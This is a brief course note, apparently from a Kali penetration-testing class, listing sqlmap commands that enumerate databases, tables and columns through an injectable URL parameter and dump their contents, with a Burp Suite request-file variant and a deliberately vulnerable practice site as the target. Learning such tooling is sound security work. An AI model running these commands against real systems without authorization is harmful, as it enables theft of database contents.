# 16_Control Database Server with SQLMap

[Control Database Server with SQLMap 👉VIDEO &#128279;](https://codered.eccouncil.org/courseVideo/Kali-for-Penetration-Testers?lessonId=bdae6757-76a7-4def-a679-0edb37ff7a19&finalAssessment=false)

**Command**

- `php?id=1`
  - sqlmap -u <url> --dbs
  - sqlmap -u <url> -D <databas_name> --tables
  - sqlmap -u <url> -D <databas_name> -T <table_name> --columns
  - sqlmap -u <url> -D <databas_name> -T <table_name> -C <columns_name> --dump

**Test Website**

[Testphp wesite &#128279;](testphp.vulnweb.com/index.php)

**BURP SUITE**

- Kali Machine
  - sqlmap -r <filename.txt>
